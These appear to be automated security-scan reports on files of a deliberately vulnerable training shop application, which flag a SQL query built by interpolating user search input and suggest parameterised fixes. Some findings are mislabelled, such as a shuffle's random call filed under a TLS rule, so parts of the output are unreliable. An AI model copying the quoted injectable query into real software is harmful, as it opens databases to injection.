**Scanned at**: 2026-10-11T16:35:25.423931+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 6 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 6
models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [DEP-M-002](https://verify.example-org.internal/?id=DEP-M-002) | Package Manager Lifecycle Script Hardening |
| 🟠 High | [DEP-M-003](https://verify.example-org.internal/?id=DEP-M-003) | Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion) |
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🔴 Critical | [AJAX-M-002](https://verify.example-org.internal/?id=AJAX-M-002) | AJAX Response Sanitization & XSS Prevention |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🔴 Critical | [INJECT-M-002](https://verify.example-org.internal/?id=INJECT-M-002) | OS Command Injection Prevention |
| 🔴 Critical | [INJECT-M-003](https://verify.example-org.internal/?id=INJECT-M-003) | XML External Entity (XXE) Prevention |
| 🟠 High | [AJAX-M-001](https://verify.example-org.internal/?id=AJAX-M-001) | AJAX Request Validation & CSRF Protection |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 6, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/data/static/codefixes/unionSqlInjectionChallenge_3.ts`
**Scanned at**: 2026-10-11T16:35:25.837707+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 10 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 10
models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [DEP-M-002](https://verify.example-org.internal/?id=DEP-M-002) | Package Manager Lifecycle Script Hardening |
| 🟠 High | [DEP-M-003](https://verify.example-org.internal/?id=DEP-M-003) | Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion) |
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🔴 Critical | [AJAX-M-002](https://verify.example-org.internal/?id=AJAX-M-002) | AJAX Response Sanitization & XSS Prevention |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🔴 Critical | [INJECT-M-002](https://verify.example-org.internal/?id=INJECT-M-002) | OS Command Injection Prevention |
| 🔴 Critical | [INJECT-M-003](https://verify.example-org.internal/?id=INJECT-M-003) | XML External Entity (XXE) Prevention |
| 🟠 High | [AJAX-M-001](https://verify.example-org.internal/?id=AJAX-M-001) | AJAX Request Validation & CSRF Protection |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 10, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/frontend/src/app/coding-challenge-page/components/coding-challenge-fix-it/coding-challenge-fix-it.component.ts`
**Scanned at**: 2026-10-11T16:35:26.968078+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🟡 MEDIUM | [CRYPT-M-002](https://verify.example-org.internal/?id=CRYPT-M-002) | Encryption in Transit (TLS 1.3+) | 120 |

#### [CRYPT-M-002](https://verify.example-org.internal/?id=CRYPT-M-002) — Non-cryptographic random number generator detected
```ts
// Line 120
.map((fix, index) => ({ fix, index, sort: Math.random() }))
```
**Suggested fix:**
```ts
// Suggested fix: use a cryptographically secure RNG
// WRONG:  const token = Math.random().toString(36);
const token = crypto.randomUUID();                          // browser / Node 19+
// or:  const buf = crypto.getRandomValues(new Uint8Array(32));  // raw bytes
# Python:  import secrets; token = secrets.token_urlsafe(32)
```
> 💡 **Why**: Risk: Unencrypted or weakly encrypted data in transit is vulnerable to interception, man-in-the-middle attacks, and eavesdropping on networks.
> 🔧 **Guidance**: Configure TLS 1.3 as minimum. Disable TLS 1.0, 1.1, 1.2. Use modern cipher suites. Disable weak ciphers (RC4, DES, MD5).
> [Full remediation →](https://verify.example-org.internal/?id=CRYPT-M-002)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [INPUT-M-002](https://verify.example-org.internal/?id=INPUT-M-002) | Input Encoding & Output Encoding |
| 🔴 Critical | [SAST-M-006](https://verify.example-org.internal/?id=SAST-M-006) | Native Memory Safety and Unsafe Code Assurance |
| 🟠 High | [CRYPT-M-006](https://verify.example-org.internal/?id=CRYPT-M-006) | Hardware Security Module (HSM) for High-Value Keys |
| 🟠 High | [IDOR-M-003](https://verify.example-org.internal/?id=IDOR-M-003) | Avoid Exposing IDs in URLs |
| 🟠 High | [INPUT-M-001](https://verify.example-org.internal/?id=INPUT-M-001) | Whitelist-Based Input Validation |
| 🔴 Critical | [COOK-M-001](https://verify.example-org.internal/?id=COOK-M-001) | Secure Cookie Attributes (HttpOnly, Secure, SameSite) |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "CRYPT-M-002", "severity": "MEDIUM", "line": 120, "message": "Non-cryptographic random number generator detected", "fix_snippet": "// Suggested fix: use a cryptographically secure RNG\n// WRONG:  const token = Math.random().toString(36);\nconst token = crypto.randomUUID();                          // browser / Node 19+\n// or:  const buf = crypto.getRandomValues(new Uint8Array(32));  // raw bytes\n# Python:  import secrets; token = secrets.token_urlsafe(32)"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/frontend/src/app/register/register.component.spec.ts`
**Scanned at**: 2026-10-11T16:35:36.876546+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing | 137 |

#### [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) — Hardcoded password literal detected
```ts
// Line 137
const password = 'aaaaa'
```
**Suggested fix:**
```ts
# Suggested fix: load passwords from environment, hash with bcrypt
import os, bcrypt
# Never store plain-text passwords
password_hash = bcrypt.hashpw(os.environ['USER_PASSWORD'].encode(), bcrypt.gensalt())
# Verify: bcrypt.checkpw(supplied_password.encode(), password_hash)
```
> 💡 **Why**: Risk: If a password database is breached, using weak or unsalted hashes (like MD5 or SHA1) allows attackers to use 'rainbow tables' to crack millions of passwords in seconds. Strong KDFs make this computationally infeasible.
> 🔧 **Guidance**: A developer must refactor the authentication code to use a modern, approved library for password hashing (e.g., `spring-security-crypto`) and not use deprecated functions like `java.security.MessageDigest.getInstance("MD5")`.
> [Full remediation →](https://verify.example-org.internal/?id=AUTH-M-001)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [CRYPT-M-006](https://verify.example-org.internal/?id=CRYPT-M-006) | Hardware Security Module (HSM) for High-Value Keys |
| 🟠 High | [IDOR-M-002](https://verify.example-org.internal/?id=IDOR-M-002) | Opaque Object Identifiers |
| 🟠 High | [IDOR-M-005](https://verify.example-org.internal/?id=IDOR-M-005) | IDOR Test Coverage Matrix |
| 🟠 High | [INPUT-M-001](https://verify.example-org.internal/?id=INPUT-M-001) | Whitelist-Based Input Validation |
| 🟠 High | [INPUT-M-002](https://verify.example-org.internal/?id=INPUT-M-002) | Input Encoding & Output Encoding |
| 🔴 Critical | [IDOR-M-001](https://verify.example-org.internal/?id=IDOR-M-001) | IDOR Protection |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "AUTH-M-001", "severity": "CRITICAL", "line": 137, "message": "Hardcoded password literal detected", "fix_snippet": "# Suggested fix: load passwords from environment, hash with bcrypt\nimport os, bcrypt\n# Never store plain-text passwords\npassword_hash = bcrypt.hashpw(os.environ['USER_PASSWORD'].encode(), bcrypt.gensalt())\n# Verify: bcrypt.checkpw(supplied_password.encode(), password_hash)"}]
-->

<!-- CODI_ADVISORY_JSON
